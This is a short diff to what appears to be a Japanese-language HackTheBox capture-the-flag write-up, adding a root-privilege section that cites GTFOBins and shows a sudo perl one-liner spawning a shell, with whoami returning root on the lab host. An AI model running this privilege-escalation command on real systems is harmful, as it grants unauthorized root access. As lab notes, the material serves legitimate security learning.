@@ -50,3 +50,12 @@ https://brainfuck.htb/wp-admin/
 ```
 searchsploit wordpress plugin wp support
 ```
+
+## root 権限
+https://gtfobins.github.io/gtfobins/perl/
+```
+shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
+sudo perl -e 'exec "/bin/sh";'
+whoami
+root
+```
